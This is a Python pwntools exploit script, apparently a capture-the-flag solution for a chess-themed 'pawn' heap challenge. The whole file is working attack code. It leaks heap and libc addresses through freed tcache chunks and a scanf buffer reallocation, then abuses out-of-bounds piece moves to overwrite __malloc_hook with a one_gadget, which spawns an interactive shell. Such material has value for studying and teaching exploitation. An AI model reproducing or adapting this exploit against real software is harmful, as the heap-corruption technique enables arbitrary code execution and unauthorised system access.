#!/usr/bin/env python3

from pwn import *

the_binary = "./pawn"
context.binary = ELF(the_binary, checksec=False)
elf = context.binary
libc = ELF("./libc.so.6", checksec=False)

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("shell.actf.co", 21706)
elif args.STRACE:
    io = process(["strace", "-o" ,"strace.txt", the_binary])
elif args.LTRACE:
    io = process(["ltrace", "-o", "ltrace.txt", the_binary])
else:
    io = process(the_binary, env={"LD_PRELOAD": libc.path})

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}
        continue
    """)

def choice(num):
    io.sendlineafter("5) Delete Board\n", str(num))

def index(idx):
    io.sendlineafter("index?\n", str(idx))

def coords(x, y):
    log.debug("Sending coordinates:")
    log.debug("x = %#x, y = %#x" % (x, y)) 
    io.sendlineafter("spaces.\n", f"{x} {y}")

def free(idx):
    choice(5)
    index(idx)

def create(idx):
    choice(1)
    index(idx)

def show(idx):
    choice(2)
    index(idx)

t = 0
def move(idx, from_, to):
    global t
    choice(3)
    index(idx)
    coords(*from_)
    coords(*to)

    resp = io.recvuntil(".")
    if b"Invalid" in resp:
        log.error("Bad move")

    t += 1

def smite(idx, where):
    choice(4)
    index(idx)
    coords(*where)

toggle = True
def inc_t():
    global toggle
    if toggle:
        move(4, [6, 7], [5, 5])
    else:
        move(4, [5, 5], [6, 7])
    toggle = not toggle

def set_t(target):
    global t
    while (t & 0xff) != target:
        inc_t()

def byte_at(qword, idx):
    return (qword >> idx*8) & 0xff

# Each create/free is acting on two 0x50-sized chunks: one for the board
# row pointers and one for the actual board character contents.
create(0)
create(1)
create(2)
create(3)
free(3)
free(2)
free(1)
free(0)

# Leak freed tcache chunk fd pointer.
show(1)
io.recvuntil("0 ")
raw_leak = io.recvuntil("\n", drop=True)
heap_leak = u64(raw_leak.ljust(8, b"\x00"))
heap_base = heap_leak - 0x13f0
log.info("Heap leak: %#x" % heap_leak)
log.success("Heap base: %#x" % heap_base)

# A sufficiently long choice causes scanf to allocate and free a buffer on the
# heap, which then ends up in the smallbin with libc pointers written into it.
# We can consequently derive our libc leak from there.
choice("0"*0x1024 + "6")

# Leak libc pointer, which was written into the contents of one of the freed
# board chunks when internal stdin buffer was re-sized.
show(0)
io.recvuntil("0 ")
raw_leak = io.recvuntil("\n", drop=True)
libc_leak = u64(raw_leak.ljust(8, b"\x00"))
libc.address = libc_leak - 0x1ebc10
log.info("libc leak: %#x" % libc_leak)
log.success("libc base: %#x" % libc.address)

# See if libc pointers will have rook characters encoded in them, for later
# use via pointers that appear near __malloc_hook.
for i in [2, 3, 4,]:
    if chr(byte_at(libc_leak, i)) in ["R", "r",]:
        piece_byte_pos = i
        break
else:
    log.error("No rooks encoded in libc address")

# Use leaked heap pointer to dereference the board into the binary's GOT,
# so the second board dereference will point into libc.
create(4)

# Slowly move 0x70 bytes from main_arena pointers over __malloc_hook.
boards_4_addr = heap_base + 0x1300
printf_offset = -((boards_4_addr - elf.got.printf) // 8)
log.info("Using offset to printf@GOT from boards[4] of %#x" % printf_offset)

malloc_hook_offset = libc.sym.__malloc_hook - libc.sym.printf
log.info("Using offset to __malloc_hook from printf of %#x" % malloc_hook_offset)

def smite_rel_malloc_hook(idx, allow_alpha=False):
    global t
    if not allow_alpha:
        while chr(t & 0xff).isalpha():
            inc_t()
    smite(4, [malloc_hook_offset + idx, printf_offset])

def move_rel_malloc_hook(from_, to):
    move(
        4,
        [malloc_hook_offset + from_, printf_offset],
        [malloc_hook_offset + to, printf_offset]
    )

# Ensure the heap address at this position is cleared, so as to avoid alpha
# characters that prevent our movement of pieces over __malloc_hook.
for i in range(0x70, 0x78):
    smite_rel_malloc_hook(i)

for malloc_hook_byte_pos in range(8):
    pointer_offset = 0x80 + malloc_hook_byte_pos*8
    for byte_pos in range(8):
        if byte_pos != piece_byte_pos:
            # Clear values of all other bytes in the pointers that don't
            # contain a rook byte, so they don't get in the way of our moving
            # "rooks".
            smite_rel_malloc_hook(pointer_offset + byte_pos)

    # Move the "rook" over one of __malloc_hook's bytes so that we can smite
    # it with a one gadget byte later.
    move_rel_malloc_hook(pointer_offset + piece_byte_pos, malloc_hook_byte_pos)

one_gadget = libc.address + 0xe6c81
log.info("Attempting __malloc_hook overwrite with one gadget: %#x" % one_gadget)
for i in range(8):
    set_t(byte_at(one_gadget, i))
    smite_rel_malloc_hook(i, allow_alpha=True)

# Trigger overwritten __malloc_hook.
create(1)
io.interactive()
